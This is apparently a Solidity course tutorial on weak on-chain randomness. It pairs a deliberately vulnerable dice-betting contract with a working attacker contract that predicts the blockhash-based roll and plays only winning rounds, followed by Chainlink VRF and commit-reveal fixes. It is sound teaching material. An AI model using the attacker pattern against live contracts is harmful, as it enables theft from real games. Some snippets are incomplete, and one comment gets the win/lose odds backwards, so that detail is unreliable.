# Challenge 3: Dice Game

## TLDR

Build a simple betting game where players try to roll above a threshold - then **exploit it**. This challenge teaches the critical lesson that **randomness on a deterministic blockchain is fundamentally broken** if done naively. Block variables (hash, timestamp) are predictable and exploitable.

## Core Concepts

### What You're Building
A dice game where:
- Players send ETH to roll
- If roll is above threshold → player wins double
- If roll is below → house keeps the ETH
- **Then**: Build an attacker contract that wins every time

### Why On-Chain Randomness is Broken

```
┌─────────────────────────────────────────────────────────────────┐
│ THE PROBLEM                                                     │
├─────────────────────────────────────────────────────────────────┤
│ Ethereum is DETERMINISTIC. Every node must compute the same     │
│ result. There's no true randomness source.                      │
│                                                                 │
│ block.timestamp  → Miner controlled (±15 seconds)               │
│ block.number     → Predictable (every ~12 seconds)              │
│ blockhash()      → Known BEFORE your tx executes                │
│ block.prevrandao → Better but still manipulable by validators   │
│                                                                 │
│ ATTACKERS can compute the same "random" value and only play     │
│ when they know they'll win.                                     │
└─────────────────────────────────────────────────────────────────┘
```

### Key Mechanics

1. **The Vulnerable Game**
   ```solidity
   contract DiceGame {
       uint256 public nonce = 0;
       uint256 public prize;
       
       event Roll(address indexed player, uint256 roll);
       event Winner(address winner, uint256 amount);

       constructor() payable {
           prize = ((address(this).balance * 10) / 100); // 10% of balance
       }

       function rollTheDice() public payable {
           require(msg.value >= 0.002 ether, "Min bet is 0.002 ETH");
           
           // VULNERABLE: Predictable randomness!
           bytes32 prevHash = blockhash(block.number - 1);
           bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
           uint256 roll = uint256(hash) % 16; // 0-15
           
           nonce++;
           
           emit Roll(msg.sender, roll);
           
           if (roll > 5) { // ~62.5% chance to lose
               uint256 payout = prize * 2;
               prize = 0;
               (bool success, ) = msg.sender.call{value: payout}("");
               require(success, "Payout failed");
               emit Winner(msg.sender, payout);
           }
       }
   }
   ```

2. **The Attacker Contract**
   ```solidity
   contract RiggedRoll {
       DiceGame public diceGame;
       
       constructor(address gameAddress) {
           diceGame = DiceGame(gameAddress);
       }
       
       function attack() public payable {
           require(address(this).balance >= 0.002 ether, "Need funds");
           
           // Compute the SAME random value the game will use
           bytes32 prevHash = blockhash(block.number - 1);
           bytes32 hash = keccak256(abi.encodePacked(
               prevHash, 
               address(diceGame), 
               diceGame.nonce()
           ));
           uint256 roll = uint256(hash) % 16;
           
           // Only play if we KNOW we'll win
           require(roll > 5, "Would lose, reverting");
           
           diceGame.rollTheDice{value: 0.002 ether}();
       }
       
       receive() external payable {}
   }
   ```

### The Attack Explained

1. Attacker computes the "random" value using same inputs
2. If value would lose → revert (costs minimal gas)
3. If value would win → proceed with transaction
4. Attacker wins 100% of attempted plays

## Security Considerations

### Secure Randomness Solutions

1. **Chainlink VRF** (Recommended)
   - Off-chain randomness with on-chain verification
   - Provably fair, can't be manipulated
   ```solidity
   import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";
   
   contract SecureDiceGame is VRFConsumerBase {
       bytes32 internal keyHash;
       uint256 internal fee;
       
       function requestRandomRoll() public payable returns (bytes32) {
           require(msg.value >= betAmount);
           return requestRandomness(keyHash, fee);
       }
       
       function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
           uint256 roll = randomness % 16;
           // Process result
       }
   }
   ```

2. **Commit-Reveal Scheme**
   - Two-phase: commit hash, then reveal
   - Prevents prediction but adds complexity
   ```solidity
   // Phase 1: Player commits hash(secret + choice)
   function commit(bytes32 commitHash) public payable {
       commits[msg.sender] = Commit(commitHash, block.number);
   }
   
   // Phase 2: Player reveals, randomness uses their secret
   function reveal(bytes32 secret) public {
       require(commits[msg.sender].blockNumber < block.number);
       // Use secret in randomness calculation
   }
   ```

3. **block.prevrandao (Post-Merge)**
   - Better than blockhash but validators can still influence
   - Not suitable for high-value outcomes

## Code Patterns

### Secure Dice with Chainlink VRF v2
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol";
import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";

contract SecureDiceGame is VRFConsumerBaseV2 {
    VRFCoordinatorV2Interface COORDINATOR;
    
    uint64 subscriptionId;
    bytes32 keyHash;
    uint32 callbackGasLimit = 100000;
    uint16 requestConfirmations = 3;
    
    mapping(uint256 => address) public requestToPlayer;
    mapping(uint256 => uint256) public requestToBet;
    
    event DiceRolled(uint256 indexed requestId, address indexed player);
    event DiceResult(uint256 indexed requestId, uint256 roll, bool won);

    constructor(uint64 _subscriptionId, address _vrfCoordinator, bytes32 _keyHash) 
        VRFConsumerBaseV2(_vrfCoordinator) 
    {
        COORDINATOR = VRFCoordinatorV2Interface(_vrfCoordinator);
        subscriptionId = _subscriptionId;
        keyHash = _keyHash;
    }

    function rollDice() external payable returns (uint256 requestId) {
        require(msg.value >= 0.01 ether, "Min bet 0.01 ETH");
        
        requestId = COORDINATOR.requestRandomWords(
            keyHash,
            subscriptionId,
            requestConfirmations,
            callbackGasLimit,
            1 // numWords
        );
        
        requestToPlayer[requestId] = msg.sender;
        requestToBet[requestId] = msg.value;
        
        emit DiceRolled(requestId, msg.sender);
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        address player = requestToPlayer[requestId];
        uint256 bet = requestToBet[requestId];
        uint256 roll = randomWords[0] % 16;
        
        bool won = roll > 5;
        
        if (won) {
            (bool success, ) = player.call{value: bet * 2}("");
            require(success);
        }
        
        emit DiceResult(requestId, roll, won);
    }
}
```

## Common Gotchas

1. **blockhash() only works for last 256 blocks** - Returns 0 for older blocks
2. **Miners/validators have slight control** over block variables
3. **Front-running**: Others can see your pending tx and react
4. **Flash loans can amplify attacks** on predictable randomness

## Real-World Applications

- Casino / gambling dApps (require Chainlink VRF)
- NFT trait generation at mint (VRF or commit-reveal)
- Lottery systems
- Random selection for governance
- Gaming loot drops

## Builder Checklist

- [ ] NEVER use blockhash/timestamp for valuable randomness
- [ ] Use Chainlink VRF for production randomness
- [ ] Consider commit-reveal for simpler cases
- [ ] Account for callback delay in VRF (async)
- [ ] Fund Chainlink subscription with LINK
- [ ] Test attack vectors before deployment
